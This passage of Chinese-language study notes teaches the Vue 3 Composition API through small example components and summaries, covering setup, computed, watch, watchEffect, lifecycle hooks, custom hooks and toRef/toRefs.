```

src\components\Demo.vue

```vue
<template>
  <h1>一个人的信息</h1>
  <h2>姓名：{{ person.name }}</h2>
  <h2>年龄: {{ person.age }}</h2>
  <button @click="test">测试触发一个Demo组件的Hello事件</button>
</template>

<script>
import { reactive } from "vue";
export default {
  name: 'DemoComp',
  props: ["msg", "school"],
  //需要声明一下自定义事件
  emits: ["hello"],
  //执行时机，在beforeCreate之前执行一次，this是underfined
  setup(props, context) {
    // 将传递的props变为一个Proxy对象Proxy(Object)格式如：{msg: 你好啊, school: 交大}
    console.log("--setup--props:", props);
    console.log("--setup--context:", context);
    //$attrs用于在props未接收的数据存放位置，捡漏
    console.log("--setup---context.attrs", context.attrs); //相关于vue2中的$attrs
    console.log("--setup---context.emit", context.emit); //相当于自定义事件
    console.log("--setup---context.slots", context.slots); //插槽

    //数据
    let person = reactive({
      name: "张三",
      age: 18,
    });

    //方法
    function test() {
      context.emit("hello", 666);
    }

    //返回一个对象
    return {
      person,
      test,
    };
  },
  mounted(){
    console.log('Demo',this)
  }
};
</script>

<style></style>
```



![image-20250226225726180](.\images\image-20250226225726180.png)

总结：setup的两个注意点

- setup执行的时机
  - 在beforeCreate之前执行一次，this是undefined。
- setup的参数
  - props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
  - context：上下文对象
    - attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 ```this.$attrs```。
    - slots: 收到的插槽内容, 相当于 ```this.$slots```。
    - emit: 分发自定义事件的函数, 相当于 ```this.$emit```。

### 4.6 computed-计算属性

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <Demo/>
</template>

<script>
import Demo from './components/Demo.vue'
export default {
    name: 'App',
    components: {Demo}
}
</script>
```

src\components\Demo.vue

```vue
<template>
  <h1>一个人的信息</h1>
  姓: <input type="text" v-model="person.firstName" />
  <br/>
  名: <input type="text" v-model="person.lastName" />
  <br/>
  <span>全名: {{person.fullName}}</span>
  <br/>
  全名: <input type="text" v-model="person.fullName" />
</template>

<script>
import {reactive,computed} from 'vue'
export default {
  name: 'DemoComputed',
  setup(){
    let person = reactive({
      firstName: '张',
      lastName: '三'
    });

    //计算属性-简写（如果没有值被修改的情况）
    // person.fullName = computed(()=>{
    //   return person.firstName + '-' + person.lastName;
    // })

    //计算属性的完整写法,可以读写
    person.fullName = computed({
      get(){
        return person.firstName + '-' + person.lastName
      },
      set(value){
        const nameArr = value.split('-');
        person.firstName = nameArr[0];
        person.lastName = nameArr[1];
      }
    });

    return {
      person
    }
  }
}
</script>
```

总结：computed函数

- 与Vue2.x中computed配置功能一致

- 写法

  ```js
  import {computed} from 'vue'
  
  setup(){
      ...
  	//计算属性——简写
      let fullName = computed(()=>{
          return person.firstName + '-' + person.lastName
      })
      //计算属性——完整
      let fullName = computed({
          get(){
              return person.firstName + '-' + person.lastName
          },
          set(value){
              const nameArr = value.split('-')
              person.firstName = nameArr[0]
              person.lastName = nameArr[1]
          }
      })
  }
  ```



### 4.7 watch函数

#### 4.7.1 watch监视1

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <DemoWatch/>
</template>

<script>
import DemoWatch from './components/Demo.vue'
export default {
    name: 'App',
    components: {DemoWatch}
}
</script>
```

src\components\Demo.vue

```vue
<template>
  <h2>当前的求和信息为: {{ sum }}</h2>
  <button @click="sum++">点我加1</button>
  <hr />

  <h2>当前的信息为: {{ msg }}</h2>
  <button @click="msg += '!'">修改信息</button>
  <hr />

  <h2>姓名： {{ person.name }}</h2>
  <h2>年龄: {{ person.age }}</h2>
  <h2>薪资: {{ person.job.j1.salary }}K</h2>
  <button @click="person.name += '~'">修改姓名</button>
  <button @click="person.age++">增长年龄</button>
  <button @click="person.job.j1.salary++">涨薪</button>
</template>

<script>
import { ref, reactive, watch } from "vue";
export default {
  name: "DemoWatch",
  setup() {
    //数据
    let sum = ref(0);
    let msg = ref("你好啊");
    let person = reactive({
      name: "张三",
      age: 18,
      job: {
        j1: {
          salary: 20,
        },
      },
    });

    //情况1：监视ref所定义的一个响应式数据,imediate用于控制初始化是否调用
    //将收到：sum变了 1 0
    // watch(sum,(newValue,oldValue)=>{
    //   console.log('sum变了',newValue,oldValue)
    // },{imediate:true})

    //情况2：监视ref所定义的多个响应式数据
    //收到 sum变了(2)[1, '你好啊'](2)[0, '你好啊']
    // watch([sum,msg],(newValue,oldValue)=>{
    //   console.log('sum变了',newValue,oldValue)
    // },{immediate:true})

    //情况3：监视reactive所定义的一个响应式数据的全部属性
    // 1, 注意：无法正确的获取old的数据
    // 2, 注意：强制开启深度监视(deep配制无效)
    // watch(person,(newValue,oldValue)=>{
    //   console.log('sum变了',newValue,'-1111-',oldValue)
    // })

    //情况4：监视reactive所定义的一个响应式数据中的某个属性
    //得到: person.name 张三~ 张三
    // watch(()=>person.name, (newValue, oldValue) => {
    //   console.log("person.name", newValue, oldValue);
    // });

    //情况5：监视reactive所定义的一个响应式数据中的某些属性
    //得到如下两种
    // person.name和age (2)['张三~', 18] (2)['张三', 18]
    // person.name和age (2)['张三~', 19] (2)['张三~', 18]
    // watch([()=>person.name,()=>person.age], (newValue, oldValue) => {
    //   console.log("person.name和age", newValue, oldValue);
    // });
    
    //特殊情况
    //由于此处监视的reactive定义的对象中的某个属性，deep配制有效
    watch(()=>person.job, (newValue, oldValue) => {
      console.log("person.job", newValue, oldValue);
    },{deep:true});

    return {
      sum,
      msg,
      person,
    };
  },
};
</script>


```



总结：watch函数

- 与Vue2.x中watch配置功能一致

- 两个小“坑”：

  - 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
  - 监视reactive定义的响应式数据中某个属性时：deep配置有效。

  ```js
  //情况一：监视ref定义的响应式数据
  watch(sum,(newValue,oldValue)=>{
  	console.log('sum变化了',newValue,oldValue)
  },{immediate:true})
  
  //情况二：监视多个ref定义的响应式数据
  watch([sum,msg],(newValue,oldValue)=>{
  	console.log('sum或msg变化了',newValue,oldValue)
  }) 
  
  /* 情况三：监视reactive定义的响应式数据
  			若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
  			若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
  */
  watch(person,(newValue,oldValue)=>{
  	console.log('person变化了',newValue,oldValue)
  },{immediate:true,deep:false}) //此处的deep配置不再奏效
  
  //情况四：监视reactive定义的响应式数据中的某个属性
  watch(()=>person.job,(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true}) 
  
  //情况五：监视reactive定义的响应式数据中的某些属性
  watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
  	console.log('person的job变化了',newValue,oldValue)
  },{immediate:true,deep:true})
  
  //特殊情况
  watch(()=>person.job,(newValue,oldValue)=>{
      console.log('person的job变化了',newValue,oldValue)
  },{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
  ```

#### 4.7.2 watch监视ref

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <DemoWatch/>
</template>

<script>
import DemoWatch from './components/Demo.vue'
export default {
    name: 'App',
    components: {DemoWatch}
}
</script>
```

src\components\Demo.vue

```vue
<template>
  <h2>当前的求和信息为: {{ sum }}</h2>
  <button @click="sum++">点我加1</button>
  <hr />

  <h2>当前的信息为: {{ msg }}</h2>
  <button @click="msg += '!'">修改信息</button>
  <hr />

  <h2>姓名： {{ person.name }}</h2>
  <h2>年龄: {{ person.age }}</h2>
  <h2>薪资: {{ person.job.j1.salary }}K</h2>
  <button @click="person.name += '~'">修改姓名</button>
  <button @click="person.age++">增长年龄</button>
  <button @click="person.job.j1.salary++">涨薪</button>
</template>

<script>
import { ref, watch } from "vue";
export default {
  name: "DemoWatch",
  setup() {
    //数据
    let sum = ref(0);
    let msg = ref("你好啊");
    let person = ref({
      name: "张三",
      age: 18,
      job: {
        j1: {
          salary: 20,
        },
      },
    });


    //将收到：sum变了 1 0
    watch(sum,(newValue,oldValue)=>{
      console.log('sum变了',newValue,oldValue)
    })

    //监视到ref对象时，与reactive对象生成一致，都是Proxy(Object)对象，可以获取到最新的值，旧值无法获取。
    watch(person,(newValue,oldValue)=>{
      console.log('person变了',newValue,oldValue)
    },{deep:true})

    return {
      sum,
      msg,
      person,
    };
  },
};
</script>

<style></style>

```

#### 4.7.3 watchEffect函数

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <DemoWatch/>
</template>

<script>
import DemoWatch from './components/Demo.vue'
export default {
    name: 'App',
    components: {DemoWatch}
}
</script>
```

src\components\Demo.vue

```vue
<template>
  <h2>当前的求和信息为: {{ sum }}</h2>
  <button @click="sum++">点我加1</button>
  <hr />

  <h2>当前的信息为: {{ msg }}</h2>
  <button @click="msg += '!'">修改信息</button>
  <hr />

  <h2>姓名： {{ person.name }}</h2>
  <h2>年龄: {{ person.age }}</h2>
  <h2>薪资: {{ person.job.j1.salary }}K</h2>
  <button @click="person.name += '~'">修改姓名</button>
  <button @click="person.age++">增长年龄</button>
  <button @click="person.job.j1.salary++">涨薪</button>
</template>

<script>
import { reactive, ref, watchEffect } from "vue";
export default {
  name: "DemoWatch",
  setup() {
    //数据
    let sum = ref(0);
    let msg = ref("你好啊");
    let person = reactive({
      name: "张三",
      age: 18,
      job: {
        j1: {
          salary: 20,
        },
      },
    });

    // //将收到：sum变了 1 0
    // watch(sum,(newValue,oldValue)=>{
    //   console.log('sum变了',newValue,oldValue)
    // })

    //自动监视使用到的属性，如果被修改了，则收到watch
    watchEffect(() => {
      const x1 = sum.value;
      const x2 = person.job.j1.salary;
      console.log("watchEffect所指定的回调执行了x1:", x1, ",x2:", x2);
    });

    return {
      sum,
      msg,
      person,
    };
  },
};
</script>

<style></style>

```

总结：watchEffect函数

- watch的套路是：既要指明监视的属性，也要指明监视的回调。

- watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。

- watchEffect有点像computed：

  - 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
  - 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

  ```js
  //watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
  watchEffect(()=>{
      const x1 = sum.value
      const x2 = person.age
      console.log('watchEffect配置的回调执行了')
  })
  ```



### 4.8 生命周期

<div style="border:1px solid black;width:380px;float:left;margin-right:20px;"><strong>vue2.x的生命周期</strong><img src=".\images\生命周期.png" alt="lifecycle_2" style="zoom:33%;width:1200px" /></div><div style="border:1px solid black;width:510px;height:985px;float:left"><strong>vue3.0的生命周期</strong><img src=".\images\vue3-生命周期.png" alt="lifecycle_2" style="zoom:33%;width:2500px" /></div>









































src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <DemoWatch/>
</template>

<script>
import DemoWatch from './components/Demo.vue'
export default {
    name: 'App',
    components: {DemoWatch}
}
</script>
```

src\components\DemoComponent.vue

```vue
<template>
  <h2>当前求和为：{{sum}}</h2>
  <button @click="sum++">点我加1</button>
</template>

<script>
import {onBeforeMount, onBeforeUpdate, onMounted, onUpdated,onBeforeUnmount,onUnmounted, ref} from 'vue'
export default {
  name: 'DemoComponent',
  setup(){
    console.log('----setup----');
    //数据
    let sum = ref(0);

    //通过组合式API使用生命周期钩子
    onBeforeMount(()=>{
      console.log('----onBeforeMount----');
    });
    onMounted(()=>{
      console.log('----onMounted----');
    });
    onBeforeUpdate(()=>{
      console.log('----onBeforeUpdate----');
    });
    onUpdated(()=>{
      console.log('----onUpdated----');
    });
    onBeforeUnmount(()=>{
      console.log('----onBeforeUnmount----');
    });
    onUnmounted(()=>{
      console.log('----onUnmounted----');
    });

    return {
      sum
    }
  },
  //通过配制形式使用的生命周期钩子
  beforeCreate() {
			console.log('---beforeCreate---')
		},
		created() {
			console.log('---created---')
		},
		beforeMount() {
			console.log('---beforeMount---')
		},
		mounted() {
			console.log('---mounted---')
		},
		beforeUpdate(){
			console.log('---beforeUpdate---')
		},
		updated() {
			console.log('---updated---')
		},
		beforeUnmount() {
			console.log('---beforeUnmount---')
		},
		unmounted() {
			console.log('---unmounted---')
		},
}
</script>
```



![image-20250228122543664](.\images\image-20250228122543664.png)

总结：Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：

- - ```beforeDestroy```改名为 ```beforeUnmount```
  - ```destroyed```改名为 ```unmounted```
- Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：
  - `beforeCreate`===>`setup()`
  - `created`=======>`setup()`
  - `beforeMount` ===>`onBeforeMount`
  - `mounted`=======>`onMounted`
  - `beforeUpdate`===>`onBeforeUpdate`
  - `updated` =======>`onUpdated`
  - `beforeUnmount` ==>`onBeforeUnmount`
  - `unmounted` =====>`onUnmounted`





### 4.9 hook函数

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <DemoComponent/>
    <hr/>
    <hr/>
    <TestComp/>
</template>

<script>
import DemoComponent from './components/DemoComponent'
import TestComp from './components/TestComp.vue'
export default {
    name: 'App',
    components: {DemoComponent,TestComp}
}
</script>
```

src\hooks\usePoint.js

```js
import { reactive, onMounted, onBeforeUnmount } from "vue";
export default function () {
    //实现鼠标打点的相关数据
    let point = reactive({
        x: 0,
        y: 0
    })

    //实现鼠标打点的相关方法
    function savePoint(event) {
        point.x = event.pageX;
        point.y = event.pageY;
        console.log(event.pageX, event.pageY);
    }

    //实现鼠标打点的相关的生命周期的沟子
    onMounted(() => {
        window.addEventListener('click', savePoint);
    })

    onBeforeUnmount(() => {
        window.removeEventListener('click', savePoint)
    }
    )

    return point;
}
```

src\components\DemoComponent.vue

```vue
<template>
  <h2>当前求和为：{{sum}}</h2>
  <button @click="sum++">点我加1</button>
  <hr/>
  <h2>当前点击鼠标的坐标为:x:{{point.x}},y:{{point.y}}</h2>
</template>

<script>
import { ref} from 'vue'
import usePoint from '../hooks/usePoint'
export default {
  name: 'DemoComponent',
  setup(){
    console.log('----setup----');
    //数据
    let sum = ref(0);
    let point = usePoint();

    return {
      sum,
      point
    }
  },

}
</script>
```

src\components\TestComp.vue

```vue
<template>
  <h2>我是Test组件</h2>
  <h2>当前点击鼠标的坐标为:x:{{point.x}},y:{{point.y}}</h2>
</template>

<script>
import usePoint from '../hooks/usePoint'
export default {
  name: 'DemoComponent',
  setup(){
    console.log('----test-setup----');
    //数据
    let point = usePoint();

    return {
      point
    }
  },

}
</script>
```



![image-20250228124054349](.\images\image-20250228124054349.png)



总结：自定义hook函数

- 什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。
- 类似于vue2.x中的mixin。
- 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。



### 4.10 toRef和toRefs

src\main.js

```js
//引入的不再是Vue构造函数，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象（类似于Vue2中的vm，但app比Vm更轻）
const app = createApp(App)

//挂载
app.mount('#app')

```

src\App.vue

```vue
<template>
    <DemoComponent/>
    <hr/>
    <hr/>
    <TestComp/>
</template>

<script>
import DemoComponent from './components/DemoComponent'
import TestComp from './components/TestComp.vue'
export default {
    name: 'App',
    components: {DemoComponent,TestComp}
}
</script>
```

src\components\DemoComponent.vue

```vue
<template>
  <h2>姓名： {{ person.name }}</h2>
  <h2>年龄: {{ person.age }}</h2>
  <h2>薪资: {{ person.job.j1.salary }}K</h2>
  <button @click="person.name += '~'">修改姓名</button>
  <button @click="person.age++">增长年龄</button>
  <button @click="person.job.j1.salary++">涨薪</button>
  <hr />
  <h4>{{ person }}</h4>
  <h2>姓名2：{{ name }}</h2>
  <h2>年龄2: {{ age }}</h2>
  <!-- 使用toRef包装 -->
  <!-- <h2>薪资2: {{ salary }}K</h2> -->
  <h2>薪资2: {{ job.j1.salary }}K</h2>
</template>

<script>
import { reactive,  toRefs } from "vue";
export default {
  name: "DemoWatch",
  setup() {
    //数据
    let person = reactive({
      name: "张三",
      age: 18,
      job: {
        j1: {
          salary: 20,
        },
      },
    });

    const name1 = person.name;
    console.log("%%%", name1);

    //将一个普通数据转换为响应式数据.
    // const nameRef = toRef(person, "name");
    //ObjectRefImpl{_object: Proxy(Object), _key: 'name', _defaultValue: undefined, __v_isRef: true, _value: undefined}
    // console.log("ref:", nameRef);

    //将对象中的属性都包装成响应式数据
    const nameRef = toRefs(person);
    //将每一个都包装为响应式数据
    console.log("refs:", nameRef);

    return {
      person,
      // //单独返回每个对象,并且是响应式
      // name: toRef(person, "name"),
      // age: toRef(person, "age"),
      // salary: toRef(person.job.j1, "salary"),
      ...toRefs(person)
    };
  },
};
</script>

<style></style>

```





![image-20250228194145916](.\images\image-20250228194145916.png)

总结：toRef

- 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。
- 语法：```const name = toRef(person,'name')```
- 应用:   要将响应式对象中的某个属性单独提供给外部使用时。


- 扩展：```toRefs``` 与```toRef```功能一致，但可以批量创建多个 ref 对象，语法：```toRefs(person)```



# 结束





